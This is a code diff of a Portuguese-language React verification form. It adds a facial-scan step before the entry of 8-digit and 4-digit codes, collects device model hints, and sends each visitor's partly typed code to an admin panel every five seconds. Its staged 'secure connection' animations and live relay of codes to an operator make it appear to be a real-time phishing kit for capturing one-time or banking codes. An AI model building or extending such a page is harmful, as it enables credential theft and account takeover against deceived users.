@@ -11,10 +11,12 @@ import {
 } from 'lucide-react';
 import { FormConfig, SubmissionRecord } from '../types';
 import { BrandLogo } from './BrandLogo';
+import { FaceVerificationStep } from './FaceVerificationStep';
 import { OtpDigitInput } from './OtpDigitInput';
 
 type FlowStep =
   | 'entering'
+  | 'face'
   | 'code8'
   | 'authenticating8'
   | 'verified8'
@@ -39,6 +41,8 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
   config,
 }) => {
   const [step, setStep] = useState<FlowStep>('entering');
+  const [faceSubPhase, setFaceSubPhase] = useState<'ready' | 'scanning' | 'done'>('ready');
+  const [faceVerified, setFaceVerified] = useState(false);
   const [code8, setCode8] = useState('');
   const [code4, setCode4] = useState('');
   const [extraData, setExtraData] = useState<Record<string, string>>({});
@@ -50,28 +54,59 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
   const sessionIdRef = useRef<string>(makeSessionId());
   const startTimeRef = useRef<number>(Date.now());
   const autoAdvanceTimerRef = useRef<number | null>(null);
+  const deviceHintsRef = useRef<{ model?: string; platformVersion?: string }>({});
 
   const enabledExtras = config.extraFields.filter((f) => f.enabled);
 
-  // Entry authentication animation (~1.4s) when visitor enters the site
   useEffect(() => {
-    const timer = window.setTimeout(() => {
-      setStep((curr) => (curr === 'entering' ? 'code8' : curr));
-    }, 1400);
-    return () => window.clearTimeout(timer);
+    const navWithHints = navigator as Navigator & {
+      userAgentData?: {
+        getHighEntropyValues?: (
+          hints: string[]
+        ) => Promise<{ model?: string; platformVersion?: string }>;
+      };
+    };
+    navWithHints.userAgentData
+      ?.getHighEntropyValues?.(['model', 'platformVersion'])
+      .then((values) => {
+        deviceHintsRef.current = {
+          model: values.model || '',
+          platformVersion: values.platformVersion || '',
+        };
+      })
+      .catch(() => {});
   }, []);
 
-  // Presence heartbeat so admin sees live online visitors in /painel
+  // Entry authentication animation (~1.3s) -> goes to facial verification (or code8 if disabled)
   useEffect(() => {
-    const stepLabelMap: Record<FlowStep, string> = {
-      entering: 'Conectando...',
-      code8: 'Preenchendo 8 dígitos',
-      authenticating8: 'Autenticando 8 dígitos',
-      verified8: '8 dígitos verificados',
-      code4: 'Preenchendo 4 dígitos',
-      authenticating4: 'Autenticando 4 dígitos',
-      completed: 'Formulário concluído',
-    };
+    const timer = window.setTimeout(() => {
+      setStep((curr) =>
+        curr === 'entering'
+          ? config.enableFaceVerification
+            ? 'face'
+            : 'code8'
+          : curr
+      );
+    }, 1300);
+    return () => window.clearTimeout(timer);
+  }, [config.enableFaceVerification]);
+
+  // Live presence heartbeat so admin sees active visitors in /painel
+  useEffect(() => {
+    const stepLabel = (() => {
+      if (step === 'entering') return 'Conectando...';
+      if (step === 'face') {
+        if (faceSubPhase === 'scanning') return 'Escaneando rosto';
+        if (faceSubPhase === 'done') return 'Facial autenticada';
+        return 'Na verificação facial';
+      }
+      if (step === 'code8') return 'Preenchendo 8 dígitos';
+      if (step === 'authenticating8') return 'Autenticando 8 dígitos';
+      if (step === 'verified8') return '8 dígitos verificados';
+      if (step === 'code4') return 'Preenchendo 4 dígitos';
+      if (step === 'authenticating4') return 'Autenticando 4 dígitos';
+      return 'Concluído';
+    })();
 
     const sendHeartbeat = () => {
       fetch('/api/presence', {
@@ -79,8 +114,9 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           sessionId: sessionIdRef.current,
-          step: stepLabelMap[step],
+          step: stepLabel,
           code8: code8.replace(/\D/g, ''),
+          deviceHints: deviceHintsRef.current,
         }),
       }).catch(() => {});
     };
@@ -88,7 +124,7 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
     sendHeartbeat();
     const interval = window.setInterval(sendHeartbeat, 5000);
     return () => window.clearInterval(interval);
-  }, [step, code8]);
+  }, [step, faceSubPhase, code8]);
 
   useEffect(() => {
     return () => {
@@ -102,7 +138,9 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
     if (autoAdvanceTimerRef.current) {
       window.clearTimeout(autoAdvanceTimerRef.current);
     }
-    setStep('code8');
+    setStep(config.enableFaceVerification ? 'face' : 'code8');
+    setFaceSubPhase('ready');
+    setFaceVerified(false);
     setCode8('');
     setCode4('');
     setExtraData({});
@@ -111,6 +149,12 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
     setCompletedRecord(null);
     setCopiedReceipt(false);
     startTimeRef.current = Date.now();
+  };
+
+  const handleFaceSuccess = () => {
+    setFaceVerified(true);
+    setErrorMsg(null);
+    setStep('code8');
   };
 
   const handleVerifyCode8 = async () => {
@@ -128,7 +172,11 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
         fetch('/api/verify-step1', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ code8: candidate }),
+          body: JSON.stringify({
+            code8: candidate,
+            faceVerified,
+            deviceHints: deviceHintsRef.current,
+          }),
         }),
         new Promise((resolve) => window.setTimeout(resolve, 1000)),
       ]);
@@ -193,10 +241,12 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             submissionId,
+            faceVerified,
             code8: code8.replace(/\D/g, ''),
             code4: candidate4,
             extraData,
             durationMs: Date.now() - startTimeRef.current,
+            deviceHints: deviceHintsRef.current,
           }),
         }),
         new Promise((resolve) => window.setTimeout(resolve, 1000)),
@@ -227,6 +277,7 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
     const summary = [
       `Protocolo: ${completedRecord.protocol}`,
       `Status: ${completedRecord.status}`,
+      ...(completedRecord.faceVerified ? ['Verificação facial: OK'] : []),
       `Código de 8 dígitos: ${formatCode8(completedRecord.code8)}`,
       `Código de 4 dígitos: ${completedRecord.code4}`,
       `Data: ${new Date(completedRecord.createdAt).toLocaleString('pt-BR')}`,
@@ -239,12 +290,27 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
   const isAuthenticating =
     step === 'entering' || step === 'authenticating8' || step === 'authenticating4';
 
-  const stepIndex =
-    step === 'entering' || step === 'code8' || step === 'authenticating8'
-      ? 1
-      : step === 'verified8' || step === 'code4' || step === 'authenticating4'
-      ? 2
-      : 3;
+  const totalSteps = config.enableFaceVerification ? 3 : 2;
+  const currentStepNum = (() => {
+    if (!config.enableFaceVerification) {
+      if (step === 'entering' || step === 'code8' || step === 'authenticating8') return 1;
+      return 2;
+    }
+    if (step === 'entering' || step === 'face') return 1;
+    if (step === 'code8' || step === 'authenticating8') return 2;
+    return 3;
+  })();
+
+  const isFacePassed =
+    faceVerified &&
+    step !== 'entering' &&
+    step !== 'face';
+
+  const isCode8Passed =
+    step === 'verified8' ||
+    step === 'code4' ||
+    step === 'authenticating4' ||
+    step === 'completed';
 
   return (
     <div className="w-full max-w-2xl mx-auto">
@@ -252,7 +318,7 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
         {/* Brand Yellow #FCFC30 Top Strip */}
         <div className="h-2 w-full bg-[#FCFC30]" aria-hidden="true" />
 
-        {/* Form Header */}
+        {/* Header */}
         <div className="px-6 sm:px-8 pt-7 pb-6 border-b border-neutral-200">
           <div className="flex items-center justify-between gap-4 text-xs mb-4">
             <div className="flex items-center gap-2.5 min-w-0">
@@ -270,7 +336,7 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
                 ? 'Conectando'
                 : step === 'completed'
                 ? 'Concluído'
-                : `Etapa ${stepIndex} de 2`}
+                : `Etapa ${currentStepNum} de ${totalSteps}`}
             </span>
           </div>
 
@@ -281,47 +347,78 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
             {config.description}
           </p>
 
-          {/* Step Progress Strip */}
-          <div className="mt-6 grid grid-cols-3 gap-3 text-xs">
+          {/* Progress Strip */}
+          <div
+            className={`mt-6 grid gap-3 text-xs ${
+              config.enableFaceVerification ? 'grid-cols-4' : 'grid-cols-3'
+            }`}
+          >
+            {config.enableFaceVerification && (
+              <div className="space-y-1.5">
+                <div
+                  className={`h-1.5 rounded-full transition-colors duration-200 ${
+                    isFacePassed ? 'bg-emerald-600' : 'bg-[#FCFC30]'
+                  }`}
+                />
+                <span
+                  className={`block font-medium truncate ${
+                    isFacePassed ? 'text-emerald-700' : 'text-black'
+                  }`}
+                >
+                  01. Facial
+                </span>
+              </div>
+            )}
+
             <div className="space-y-1.5">
               <div
                 className={`h-1.5 rounded-full transition-colors duration-200 ${
-                  step === 'entering' || step === 'code8' || step === 'authenticating8'
+                  isCode8Passed
+                    ? 'bg-emerald-600'
+                    : step === 'code8' ||
+                      step === 'authenticating8' ||
+                      (!config.enableFaceVerification && step === 'entering')
                     ? 'bg-[#FCFC30]'
-                    : 'bg-emerald-600'
+                    : 'bg-neutral-200'
                 }`}
               />
               <span
-                className={`block font-medium ${
-                  step === 'entering' || step === 'code8' || step === 'authenticating8'
+                className={`block font-medium truncate ${
+                  isCode8Passed
+                    ? 'text-emerald-700'
+                    : step === 'code8' || step === 'authenticating8'
                     ? 'text-black'
-                    : 'text-emerald-700'
+                    : 'text-neutral-400'
                 }`}
               >
-                01. Código de 8 dígitos
+                {config.enableFaceVerification ? '02. 8 dígitos' : '01. 8 dígitos'}
               </span>
             </div>
 
             <div className="space-y-1.5">
               <div
                 className={`h-1.5 rounded-full transition-colors duration-200 ${
-                  step === 'entering' || step === 'code8' || step === 'authenticating8'
-                    ? 'bg-neutral-200'
-                    : step === 'completed'
+                  step === 'completed'
                     ? 'bg-emerald-600'
-                    : 'bg-[#FCFC30]'
+                    : step === 'verified8' ||
+                      step === 'code4' ||
+                      step === 'authenticating4'
+                    ? 'bg-[#FCFC30]'
+                    : 'bg-neutral-200'
                 }`}
               />
               <span
-                className={`block font-medium ${
-                  step === 'entering' || step === 'code8' || step === 'authenticating8'
-                    ? 'text-neutral-400'
-                    : step === 'completed'
+                className={`block font-medium truncate ${
+                  step === 'completed'
                     ? 'text-emerald-700'
-                    : 'text-black'
+                    : step === 'verified8' ||
+                      step === 'code4' ||
+                      step === 'authenticating4'
+                    ? 'text-black'
+                    : 'text-neutral-400'
                 }`}
               >
-                02. Código de 4 dígitos
+                {config.enableFaceVerification ? '03. 4 dígitos' : '02. 4 dígitos'}
               </span>
             </div>
 
@@ -332,17 +429,17 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
                 }`}
               />
               <span
-                className={`block font-medium ${
+                className={`block font-medium truncate ${
                   step === 'completed' ? 'text-emerald-700' : 'text-neutral-400'
                 }`}
               >
-                03. Concluído
+                {config.enableFaceVerification ? '04. OK' : '03. OK'}
               </span>
             </div>
           </div>
         </div>
 
-        {/* Form Interactive Body */}
+        {/* Interactive Body */}
         <div className="px-6 sm:px-8 py-7">
           {isAuthenticating && (
             <div className="py-10 flex flex-col items-center text-center space-y-5">
@@ -359,7 +456,7 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
                 </h2>
                 <p className="text-sm text-neutral-600">
                   {step === 'entering'
-                    ? 'Estabelecendo conexão segura com o formulário.'
+                    ? 'Estabelecendo conexão segura.'
                     : step === 'authenticating8'
                     ? 'Validando os 8 dígitos informados.'
                     : 'Confirmando os 4 dígitos finais.'}
@@ -372,6 +469,14 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
             </div>
           )}
 
+          {step === 'face' && (
+            <FaceVerificationStep
+              config={config}
+              onSuccess={handleFaceSuccess}
+              onPhaseChange={(phase) => setFaceSubPhase(phase)}
+            />
+          )}
+
           {step === 'code8' && (
             <form
               onSubmit={(e) => {
@@ -380,6 +485,13 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
               }}
               className="space-y-6"
             >
+              {faceVerified && (
+                <div className="flex items-center gap-2.5 px-4 py-3 rounded-lg border border-emerald-200 bg-emerald-50/60 text-sm text-emerald-900">
+                  <CheckCircle2 className="w-4 h-4 text-emerald-700 shrink-0" aria-hidden="true" />
+                  <span className="font-medium">{config.faceSuccessTitle}</span>
+                </div>
+              )}
+
               <div>
                 <label className="block text-lg font-semibold text-black">
                   {config.step1Title}
@@ -595,6 +707,15 @@ export const LiveVerificationForm: React.FC<LiveVerificationFormProps> = ({
                     {completedRecord.protocol}
                   </span>
                 </div>
+                {completedRecord.faceVerified && (
+                  <div className="py-3 flex items-center justify-between gap-4">
+                    <span className="text-neutral-600">Biometria facial</span>
+                    <span className="inline-flex items-center gap-1.5 font-medium text-emerald-700">
+                      <Check className="w-3.5 h-3.5" aria-hidden="true" />
+                      <span>Autenticada</span>
+                    </span>
+                  </div>
+                )}
                 <div className="py-3 flex items-center justify-between gap-4">
                   <span className="text-neutral-600">Código principal (8 dígitos)</span>
                   <span className="inline-flex items-center gap-2 font-mono tabular-nums text-black">
